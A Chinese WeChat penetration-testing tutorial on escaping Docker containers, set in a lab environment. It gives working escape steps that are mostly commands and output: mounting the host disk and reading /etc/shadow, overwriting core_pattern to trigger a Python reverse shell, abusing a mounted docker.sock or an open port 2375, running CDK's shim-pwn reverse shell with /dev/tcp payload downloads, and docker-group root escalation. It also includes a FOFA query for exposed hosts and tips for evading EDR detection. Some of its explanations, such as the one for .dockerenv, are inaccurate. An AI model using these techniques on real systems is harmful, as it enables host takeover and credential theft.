<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XsYWhBCxoVKVZVj3Ct-6ig)

**免责声明：**由于传播、利用本公众号李白你好所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号李白你好及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

**1**►

**前言**

我认为 docker 容器逃逸也算是提权的一种手法, 要更好的理解容器逃逸的手法，应该知道从本质上看容器内的进程只是一个受限的普通 Linux 进程, 而容器逃逸的过程我们完全可以将其理解为在一个受限进程中进行一些操作来获取未受限的完整权限, 或者是在原本受 Cgroup/Namespace 限制权限的进程获取更多权限, 当清晰的理解了这一点, 接下来的容器逃逸学习将会易如反掌。

**2**►

**容器逃逸环境搭建**

作者这里选择的是 Ubuntu-18.04 和 Ubuntu22.04, 推荐使用 Ubuntu18.04

首先安装 docker

```
curl -fsSL https://get.docker.com/ | sh


```

```
docker run ubuntu echo "welcome"   //判断是否有welcome输出


```

2、安装 Docker-Compose

```
sudo curl -L "https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
docker-compose --version   //判断是否有版本信息


```

3、Docker 设置国内镜像源

```
vi /etc/docker/daemon.json

{
    "registry-mirrors": ["http://hub-mirror.c.163.com"]
}


```

重启服务

```
systemctl restart docker.service


```

**3**►

**Linux 内核安全机制**

我们前面提到了容器逃逸的实质是从 Cgroup/Namespace 限制权限的进程获取更多权限, 因此我们就不得不提到这些名词概念

### Namespace--> 内核命名空间

Linux 的 namespace 是一种内核特性，可以将系统资源进行隔离，每个隔离的部分被称为一个 namespace。通过使用 namespace，可以将不同进程之间的资源进行隔离，使得它们感觉像是在独立的环境中运行

用简洁明了的话来说,namespace 实现了容器与容器, 容器与宿主机之间的隔离

** 而业内广为人知的 ****privileged 特权逃逸的本质也是因为特权环境打破了容器与宿主机直接的隔离实现了容器逃逸 **

我们可以详细看一下 namespace 的几种类型:

1.  PID namespace：使得每个进程都有一个独立的进程 ID，进程只能看到相同 namespace 下的其他进程。
    
2.  User namespace：使得不同 namespace 下的进程可以有不同的用户和用户组 ID，进程只能对相同 namespace 下的用户进行权限管理。
    
3.  Mount namespace：使得每个 namespace 可以有独立的挂载点和文件系统层次结构，进程只能看到相同 namespace 下的文件系统。
    
4.  Network namespace：使得每个 namespace 有独立的网络设备、IP 地址、端口等网络资源，进程只能访问相同 namespace 下的网络资源。
    
5.  UTS namespace：使得每个 namespace 有独立的主机名和域名，进程只能访问相同 namespace 下的主机名和域名。
    

通过使用这些 namespace，可以在不同的进程之间实现资源的隔离，提高系统的安全性和稳定性。

### Cgroups--> 控制组

Cgroups 本质上是在内核中附加的一系列钩子（hook），当程序运行时，内核会根据程序对资源的请求触发相应的钩子，以达到资源追踪和限制的目的。在 Linux 系统中，Cgroups 对于系统资源的管理和控制非常重要，可以帮助管理员更加精细化地控制资源的分配和使用

Cgroups 主要实现了对容器资源的分配, 限制和管理

### Capabilities

Capabilities 是 Linux 一种安全机制, 在 linux 内核 2.2 之后引入, 用于对权限更细致的控制

而容器社区一直在努力将纵深防护, 最小权限等理念和原则落地

**4**►

**单容器内信息收集**  

当我们拿到了一个 shell, 首先要判断的是当前环境是否为容器环境

### 查询 cgroup 信息

```
cat /proc/1/cgroup

```

什么是 / proc/1/cgroup?

/proc/1/cgroup 文件记录了进程的控制组 (cgroup) 信息。

在 Linux 系统中，当在容器中运行进程时，每个进程会被分配到一个或多个 cgroup 中，cgroup 可以对进程的资源使用进行控制和限制。  
从 CGroup 信息中，不仅可以判断我们是否在容器内，也能很方便判断出当前的容器是否在 Kubernetes 的编排环境中

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfESSrjLZTBQoHUGHtcSOQibwoYs31FoNv2iczyvLPVhKca340MRiayjvvAg/640?wx_fmt=png&from=appmsg)

没使用 Kubernetes 的 docker 容器，其 cgroup 信息长这样

```
5:hugetlb:/docker/f904ce4cc3834023f7e074ed582957859450e85c083f1c9922390d39126058e9

```

而 Kubernetes 默认的，长这样：

```
12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148
/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197

```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEBHjPEjJZyMqXBx9Ij6UaApa9CSc9v1WAI96KBic1ia1Aq8VpdOAySicEw/640?wx_fmt=png&from=appmsg)

因此, 我们可以稍微修改一下上述的语句

```
cat /proc/1/cgroup | grep -qi docker && echo "In Docker" || echo "Not Docker"

```

我们通过判断 cat /proc/1/cgroup 的输出内容是否有 docker 来判断是否是容器内的环境

容器环境下:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEW6hmQP4f75hDt0ux5xTzPtcQQA1Iw623Bd8ficiccuDa5CP8U79aacFg/640?wx_fmt=png&from=appmsg)

非容器环境下:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEmOMkeqqib3zxHibkxQz9L9bo1KiajhjiaVEUwrNic3YTbAiaVKjMCwhmlXjA/640?wx_fmt=png&from=appmsg)

### 检查 /.dockerenv 文件

什么是 **.dockerenv** 文件?

.dockerenv 文件是 Docker 守护进程的配置文件，它包含了 Docker 守护进程的运行参数和配置信息。这个文件通常用于配置 Docker 守护进程的行为，例如容器的网络设置、存储驱动、卷管理等。.dockerenv 文件是一个文本文件，其中包含了一些环境变量，这些环境变量描述了 Docker 守护进程的状态和配置。这个文件通常由 Docker 守护进程的配置脚本生成，并保存在 Docker 守护进程的数据目录中。

简单来说, 我们可以通过判断该文件是否存在来判断当前是否属于容器环境

```
ls -alh / |grep .dockerenv

```

很容易判断下图环境属于容器内环境

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEJdZr3uwnKQPyN7DYvWeL7pVw41ERZUtQ7QtwMle4AheZuuEwVyjWYQ/640?wx_fmt=png&from=appmsg)

值得注意的是: 如果你的 shell 权限过小的话 (www-data、或是某一服务的用户)，根目录下也是不存在. dockerenv 文件的

### 查看硬盘信息

容器输出为空，非容器有内容输出。

值得注意的是: Privileged 特权模式下是可以查看到内容的

```
fdisk -l

```

容器内环境:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEMrUxROrwOYSz3C8S1vU2Ln3HOudW8qBgzXY0yAWPUP9JI0tNoQKPLA/640?wx_fmt=png&from=appmsg)

非容器内环境:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEzb4xAz5vcjZ2K91ECibCnPhaFdAgXmeIrSwVK2P06ZdLL67eAcbCxFw/640?wx_fmt=png&from=appmsg)

我们可以通过上述方法快速判断当前的一个 shell 是否在容器环境内

而当我们成功的判断了当前环境是一个 docker 容器的环境, 我们便要尝试容器逃逸

**5**►

**Docker 配置不当导致的容器逃逸**  

这里我们再次提到 NameSpace 和 cgroups

```
Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离
Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离


```

如果设定了以下配置就会导致相应的隔离机制失效：

其实原理很简单, 就是通过权限的变更打破了原来的文件系统、网络、进程、主机名等方面的隔离

```
--privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破

--net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破

--pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破

--volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破


```

### Priviliged 特权模式容器逃逸

这里笔者的环境是 Ubuntu22.04 的版本进行复现

```
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu

```

privileged 特权容器可以说是业界最常见以及最广为人知的逃逸手法

privileged 特权容器的权限其实有很多，所以也有很多不同的逃逸方式，挂载设备读写宿主机文件是特权容器最常见的逃逸方式之一

如何判断当前容器是以 Privileged 特权模式启动的呢?

这里提供两种方式

我们可以使用 fdisk -l 查看宿主机的磁盘设备

而如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的

```
fdisk -l


```

特权模式下:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfE9lwuAhodLwbov5g5ibJ6d6MsddQkCzP5Lgb3CapWK1nFZ1rsEGJyrYg/640?wx_fmt=png&from=appmsg)

而非特权模式下:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEzshL7XUeSPCHnHsoRYI63djWg2ZMnmdanGs5ZxTcCAYyk3TV0dzNQA/640?wx_fmt=png&from=appmsg)

除此之外我们可以通过

```
cat /proc/self/status | grep CapEff


```

来判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为 0000003fffffffff 或者是 0000001fffffffff

特权模式下:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEXAzc4PoE9e3Oem19lltUQHvptb9BfHn6FjytalMYAunV4S0UUSZSibA/640?wx_fmt=png&from=appmsg)

非特权模式下:

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEdrDHJJRwbq8GNFxOiatllxDL9udxQnYv78ibj3os1noJHsLargCfOK4A/640?wx_fmt=png&from=appmsg)

那么重点来了, 如何逃逸?

环境搭建

```
docker run --rm --privileged=true -it alpine


```

进入容器后我们判断当前的特权

无论是 fdisk -l 还是 cat /proc/self/status | grep CapEff

都很容易看出当前是特权模式

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEjANyuV3zlab4E0mYNUGB5TibomTfgu7ND8wzzp0SSQoiaB8uU6FEbXfQ/640?wx_fmt=png&from=appmsg)

这里我们尝试使用文件挂载进行逃逸

何为挂载?

挂载（Mount）是将一个文件系统（通常是存储设备上的文件系统）连接到操作系统的目录树中的过程。挂载将某个文件系统与一个目录关联起来，使得该目录成为文件系统的访问点。通过挂载，文件系统中的文件和目录可以被读取和写入，就好像它们是操作系统上本地的文件一样。

```
mkdir /test && mount /dev/sda1 /test


```

我们来解读一下上面的命令

1.`mkdir /test` - 这部分命令使用 mkdir（make directory）指令在根目录（/）下创建一个名为 test 的新文件夹。即创建一个名为 test 的目录。

2.  `mount /dev/sda1 /test` - 这部分命令使用 mount 指令将 / dev/sda1 文件系统挂载到之前创建的 test 目录上。/dev/sda1 通常是硬盘分区的设备名称，而 / test 则是挂载点，指示将该文件系统挂载到此目录。
    

综合起来，命令`mkdir /test && mount /dev/sda1 /test`创建了一个名为 test 的目录，并将 / dev/sda1 文件系统挂载到该目录中。这意味着该文件系统中的文件和文件夹将出现在 / test 目录中，可以通过 / test 目录访问和操作这些文件。

然后我们再通过 cat 去查看 etc/shadow 就可以成功看到宿主机的内容了

```
cat /test/etc/shadow


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEs3hWibVLCiaXdUibYnWkzt6cdRC3bKjQKN5NwGmiaIHCvkxr7vO2ibD34cg/640?wx_fmt=png&from=appmsg)

于此同时我们也可以切换到 / test 目录下, 去做更多有价值的事情

例如操作宿主机的 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfE8ibicUibZkmuRefmmPgewe0O0ibOrcf5HYTWCzWL5iayknVWSPHX3TRjZ6Q/640?wx_fmt=png&from=appmsg)

值得一提的是

从对抗的层面上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 /etc/cron*, /root/.ssh/authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法，容器逃逸的利用手段会比大部分情况下的命令执行漏洞利用要灵活。

以目标 “获取宿主机上的配置文件” 为例，以下几种逃逸手法在容易在防御团队中暴露的概率从大到小，排序如下 (部分典型手法举例，不同的 EDR 情况不同)：

1.  mount /etc + write crontab
    
2.  mount /root/.ssh + write authorized_keys
    
3.  old CVE/vulnerability exploit
    
4.  write cgroup notify_on_release
    
5.  write procfs core_pattern
    
6.  volumeMounts: / + chroot
    
7.  remount and rewrite cgroup
    
8.  websocket/sock shell + volumeMounts: /path
    

### 挂载宿主机 procfs 逃逸

我们常说挂载宿主机 procfs 逃逸, 其本质上因为宿主机挂载了 procfs, 导致我们可以像宿主机内写入一段恶意的 payload, 比如反弹 shell, 然后利用代码制造崩溃, 触发内存转储, 就会执行我们恶意的 payload

什么是 procfs

procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 User Namespace 时。

什么是 core_pattern 文件?

core_pattern（核心转储模式）是 Linux 系统中的一个配置参数，用于定义在程序崩溃时生成核心转储文件的方式和位置。当一个程序发生崩溃（如段错误）时，操作系统会生成一个包含程序崩溃状态的核心转储文件，以便进行调试和故障排除

接下里就很好理解了, 如果宿主机中的 procfs 挂载到容器中, 我们就可以进行容器逃逸了

复现环境

```
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu


```

如果返回了两个 core_pattern 文件，那么很可能就是挂载了宿主机的 procfs

这也是挂载 procfs 可以逃逸的核心点了

```
find / -name core_pattern


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEZIDF1dibjYS1v5TjBLcOiacwhLzRXSPG6GbJtlc75gHicurfTnmibQeRvA/640?wx_fmt=png&from=appmsg)

接下来我们需要找到 docker 在当前宿主机的绝对路径

```
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfELPPDQy4ibKg28BI0bxnfPibiaBEc2sa2pWL59Bic2zvaib6moN5THM2Yryw/640?wx_fmt=png&from=appmsg)

可以看出, 当前的绝对路径为 --> 去除 work 换成 merged

```
/var/lib/docker/overlay2/a96c15fc172fbec0b7251a44e21408746afa9e9571202132618ed251db3a84a4/merged

```

接下来我们需要准备一个反弹 shell 的脚本以及一个可以制造崩溃, 触发内存转储的代码

抽丝剥茧, 我们先来准备一个反弹 shell 的脚本

```
vim /tmp/.ning.py


```

```
#!/usr/bin/python3
import  os
import pty
import socket
lhost = "172.17.0.1"
lport = 4445
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   # os.remove('/tmp/.ning.py')
   s.close()
if __name__ == "__main__":
   main()



```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEXG80hNEAoSGOUfkzqwAD2g0mCkCUCMPwCjDicfmYX5ySs3OAPQWzVkw/640?wx_fmt=png&from=appmsg)

接下来赋权并且将该脚本写到目标的 proc 目录下

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEPwcK5gnX7FAvvdE2hVqMeZaVp1xNu5LHjvmxPxPLxdk2T4Wtjk7YGQ/640?wx_fmt=png&from=appmsg)

```
echo -e "|/var/lib/docker/overlay2/
a96c15fc172fbec0b7251a44e21408746afa9e9571202132618ed251db3a84a4/merged/tmp/.ning.py
\rcore " >  /host/proc/sys/kernel/core_pattern


```

然后我们使用 c 写一个可以触发崩溃的程序

```
vim ning.c
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
gcc ning.c -o ning
chmod 777 ning


```

紧接着我们在攻击机上起监听

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfETnkTqdurVrIogBTf21Bhu0p2CHsHE9mxD6u9GEfgEhh2xGuZkuZDwg/640?wx_fmt=png&from=appmsg)

于此同时, 我们在容器内运行该程序

```
./ning


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEHF0X2ZE8HrWVOKgZrpyVPnNXaC2zVkD5DbWn2FAEdLLTX3eQiaUKhqQ/640?wx_fmt=png&from=appmsg)

成功反弹 shell

### 挂载 Docker Socket 逃逸

什么是 Docker Socket?

Docker Socket（也称为 Docker API Socket）是 Docker 引擎的 UNIX 套接字文件，用于与 Docker 守护进程（Docker daemon）进行通信。Docker 守护进程是 Docker 引擎的核心组件，负责管理和执行容器。Docker Socket 允许用户通过基于 RESTful API 的请求与 Docker 守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。

简而言之: 当容器启动时以挂载 Docker Socket 的方式启动时, 我们就可以尝试逃逸

环境复现:

```
docker run -itd --name docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu


```

1. 判断当前容器是否挂载 Docker Socket, 如果存在文件则说明 Docker Socket 被挂载

```
ls -lah /var/run/docker.sock


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEZdJ7DsbbqQX6y2MsCicdstvNvBBwEGmOOBCtOzP5ch3cTqP9rF8JFibQ/640?wx_fmt=png&from=appmsg)

如何逃逸?

我们可以在容器内部创建一个新的容器，因为 Docker Socket 被挂载到了当前容器, 所有我们可以将宿主机目录挂载到新的容器内部

即在容器内创建一个挂载了宿主机根目录的容器, 然后将目录切换到根目录即可完成逃逸

我们在当前容器内部安装 docker 命令行

```
docker exec -it docker_sock /bin/bash
apt-get update
apt-get install curl
curl -fsSL https://get.docker.com/ | sh


```

接下来的逃逸就十分简单了, 我们只需要在容器内部启动一个挂载宿主机根目录的容器即可

```
docker run -it -v /:/ning ubuntu /bin/bash


```

可以看到我们的 id 值发生变化, 说明我们已经进入了一个新的容器内部

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEEOdCLfamIRlqWlOG6W9ID9e5mwlQia6eztibsvHjVnnIcQheOXQh0vYQ/640?wx_fmt=png&from=appmsg)

这里我们切换根目录

```
chroot /ning


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfE6nvGiaulVRN3xfqdWrHpguwNkvjO9w0p7uR3zGmIkEDHtwsnOr1Q1icA/640?wx_fmt=png&from=appmsg)

查看 etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEozhja5cRlU8cZYibog8QQRVXSKp28o1pp5AD6WXdPWLptusjwhcNia8Q/640?wx_fmt=png&from=appmsg)

可以看到我们已经拿到了宿主机的权限

**6**►

**容器漏洞 CVE-2020-15257**

我们之前说过 --net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破, 该 cve 的核心就是如此

漏洞环境搭建

```
./metarget cnv install cve-2020-15257


```

启动漏洞环境

```
docker run -it --net=host --name=15257 ubuntu /bin/bash


```

判断是否使用 host 模式

```
cat /proc/net/unix | grep 'containerd-shim'


```

有结果则说明当前容器启用了 host 模式

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEawatibEibsOMSBYtAic1VNsV5CkaNC1ClOtLYnuHLLdMtIqqJOrqic5ZNg/640?wx_fmt=png&from=appmsg)

接下来我们使用大名鼎鼎的 CDK

```
https://github.com/cdk-team/CDK/wiki/CDK-Home-CN

```

如何将 CDK 上传到容器内部?

1.webshell 下直接上传

2. 非 webshell 下的出网环境

```
#vps上面开启nc
nc -lvp 999 <cdk

#容器内写入
cat < /dev/tcp/[vps-ip]/[vps-port] >cdk

#反弹宿主机shell
chmod a+X cdk
./cdk run shim-pwn reverse [ip] [port]


```

vps 上面开启 nc

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEhltUW6tVQsXab46PqHqf6DywgqwR08lLK1u0cK2FE9GIW9YlR36alQ/640?wx_fmt=png&from=appmsg)

反弹宿主机 shell

![](https://mmbiz.qpic.cn/mmbiz_jpg/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEKm9bDQUeWtRHFBKiaAAWQBtKO8gYs8As429fkKANPLJsyUkqRWqt9AQ/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEb1avaI93edHURYYP7KLfziaDheu9YppBCBRyPLVfPzxHv41eDoBvRPw/640?wx_fmt=png&from=appmsg)

**7**►

**Docker 远程 API 未授权访问逃逸**

docker 的 2375 端口是干啥的?

Docker 的 2375 端口主要用于 Docker 守护进程的监听和通信。它主要用于 Docker 容器的网络连接和通信，包括容器的启动、停止、删除等操作。该端口可以被 Docker 守护进程用于接收来自客户端的请求，并与其进行交互和通信。需要注意的是，使用该端口需要确保防火墙设置正确，以避免潜在的安全风险。

在早期的版本安装 Docker 是会默认将 2375 端口对外开放, 目前改为默认只允许本地访问

如何开启远程访问

```
vim /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375 
--containerd=/run/containerd/containerd.sock


```

如何检测 2375 端口存在未授权?

这里推荐两种方式

```
1.
curl http://192.168.110.124:2375/info
docker -H tcp://192.168.110.124:2375 info
2.
IP=`hostname -i | awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && wget http://$IP:2375


```

我们主要来分析一下第二种

```
IP=`hostname -i | awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && wget http://180.184.196.45:2375


```

1.  `hostname -i`：这是一个用于获取本地主机 IP 地址的命令。它将返回主机的 IP 地址。
    
2.  `awk -F. '{print $1 "." $2 "." $3 ".1"}'`：这是一个基于 awk 命令的处理器，用于从 IP 地址中提取前三个字段，并将第四个字段设置为 1，从而创建一个新的 IP 地址。例如，如果 IP 地址是`192.168.0.10`，这个处理程序将将其转换为`192.168.0.1`。
    
3.  `IP=`hostname -i | awk -F. '{print $1"."$2"."$3".1"}' `：这个命令将获取到的IP地址存储在一个名为`IP` 的变量中。
    
4.  `wget http://$IP:2375`：这个命令使用`wget`工具向指定的 IP 地址和端口发送 HTTP 请求。具体来说，它尝试连接到 Docker 守护进程的 REST API 端点，通常默认使用端口 2375。通过这个命令，可以从本地主机访问 Docker 守护进程，执行相关操作。
    

总的来说, 这段命令的作用是获取本地主机的 IP 地址，并通过 IP 地址和端口号连接到 Docker 守护进程

我们可以通过 fofa 语法索引

```
port="2375" && country="CN" && "Docker"


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEf91QcTLmapmZFfAIllBCt6xAumVI4HepPV543nlpjsZ3UHspXY1xXA/640?wx_fmt=png&from=appmsg)

我们使用第一种方式:

![](https://mmbiz.qpic.cn/mmbiz_jpg/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfETOrVFufBOJqctPpLXNLlM3f8l6ia1zRJxRA4xevAte1sKor839g7CQA/640?wx_fmt=jpeg&from=appmsg)

或者使用 wget, 这里一般有两种情况, 如果结果为 404, 则说明漏洞存在

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfE411oP3LTfvjdAiafaVgicBs8pOUicJ9Na2S8rZGRfVAJx9GIicdavEHeOQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEtK3oyeiaYiaMu6o3grrZGiabxLJZIF58VqQUNcUuGicTfySLcJVFYtgtdg/640?wx_fmt=png&from=appmsg)

环境搭建

将 docker 守护进程监听在 0.0.0.0

```
dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfESLU7h4ick4naFzaST5vicpab9lnfnzOyojZ9IuMAOHLYnM88LUfJW4Wg/640?wx_fmt=png&from=appmsg)

能做什么?

列出容器信息

```
curl http://<target>:2375/containers/json


```

查看容器

```
docker -H tcp://<target>:2375 ps -a


```

如何逃逸?  
这里介绍两种方法 -- 其本质都是创建一个拥有特权并且挂载宿主机 / 目录的容器

1. 新运行一个容器，挂载点设置为服务器的根目录挂载至 / mnt 目录下。

```
docker -H tcp://127.0.0.1:2375 run -it -v /:/mnt nginx:latest /bin/bash


```

接下来的操作就十分简单了, 这里不多赘述, 我们可以写计划任务, 公私钥等等

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfEHDe9kvsZiabvicBYEXPibgXP8CE7JL5fibk8yaZ8ZrrTIJHFgmxp6FffcA/640?wx_fmt=png&from=appmsg)

2. 这里直接上操作

```
#连接2375端口
export DOCKER_HOST="tcp://127.0.0.1:2375"
#创建挂载宿主机根目录的容器
docker run --rm -it --privileged -net=host -v /: /tmp/docker alpine
cd /tmp/docker
#通过chroot 切换bash
chroot ./ bash


```

其实和第一种方法差别不大, 无非是使用了 export 进行连接

值得一提的是: 我们还可以关注 2376 端口

2375 端口 --> 未加密

2376 端口 --> 加密通讯

**8**►

**Docker 用户组特性导致的权限提升**

我们都知道 Docker 需要 root 权限才能跑起来, 其运行的所有命令都是需要 sudo 来运行，。而 Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，这就如同拥有 root 的访问权限

简而言之, 如果我们拿到了一个 docker 组内用户的权限, 就可以提升到 root 权限

这是因为 Docker 守护进程会允许 root 用户和 docker 组用户访问 Docker，给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大

环境搭建: 创建一个普通用户并且进入 docker 组

```
adduser dockeruser
usermod -G docker dockeruser
newgrp docker
su dockeruser


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfESh3v5VEJFSwFP6njiaKW5TIVOVozJ18Kkcn8KEMicLdAUL8eiaCY3yb0A/640?wx_fmt=png&from=appmsg)

接下来我们以 dockeruser 的身份启动一个容器 --> 一个挂载了宿主机根目录的容器

```
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease


```

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUA82xqHFn7ic3p4jlFMBPLfErK1olntV5OzARwr3XDPMJI8liccm9cEcL2u308DwjrVMS7FsNbMOdwQ/640?wx_fmt=png&from=appmsg)

**9**►

**Docker 内部的横向移动**

大多数的容器内部命令都是被阉割的, 可能 ping,ifconfig 等命令都无法使用, 如果是出网情况下我们可以在线安装

这里推荐一款工具 -->busybox

busybox 是静态编译的, 其不依赖与系统的动态链接库, 集成了三百多个 linux 常用命令, 我们可以通过将 busybox 上传到容器内部就可以使用大部分的 linux 命令

下载地址

```
https://www.busybox.net/downloads/binaries/1.30.0-i686/busybox

```

而像传统的内网渗透工具如 fscan kscan 等均可在容器内部使用

关于 Docker 容器逃逸的内容就写到这了, 同时推荐一个项目:

```
https://github.com/RuoJi6/cloud-security

```

后期会在上面写更多的东西, 我们下期再见

**10**►

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUAUcrsLjw4hz6DNFNfSFFharnLvEAAPW6W9jmtSylI3RnEcOqsepjkAmgCRpNHyqpzoxNZfp1guLw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/XoIcX2HtlUDiaAT6GdfClQNiczAQcjGB8nSEuBiclDEPk2RAe604uoUiaRDRsoSwvlPSgwYYibnGzgFiawBeBHy8Z8SA/640?wx_fmt=jpeg)

渗透必备：使用 Proxifier 玩转代理







](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247502855&idx=1&sn=b27601baaae03ecb9477ea7a403247a1&chksm=c09abf57f7ed3641dbe79243d55687d320778ef2982241ba019649f954b69be6808dc97e1b92&scene=21#wechat_redirect)

[

![](https://mmbiz.qpic.cn/mmbiz_jpg/XoIcX2HtlUDOUm0F6QCprxjrHxUfibibLjwgicC6TAcslqpfHoGkDEVAn51BpKxMrichFUvwAFZzVLBspDL3ia7EQeg/640?wx_fmt=jpeg)

攻防中通过 docker 逃逸接管 k8s【经典打法】







](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247502793&idx=1&sn=9518a910bc6e64306732381354764905&chksm=c09ab899f7ed318f0e80c3dc45ab0740926e046b45b0b86a9e70014b7cf0fcecad1c7a3197d3&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/0VlSQrG5VxaFSrqyULYn7RsCv3gdVCDeTDAKgRQSqoKjPWuicu16jU803JO0NMdHqUfpbTWJwVXAibCymA6ROYlA/640?wxfrom=5&wx_fmt=gif&wx_lazy=1)

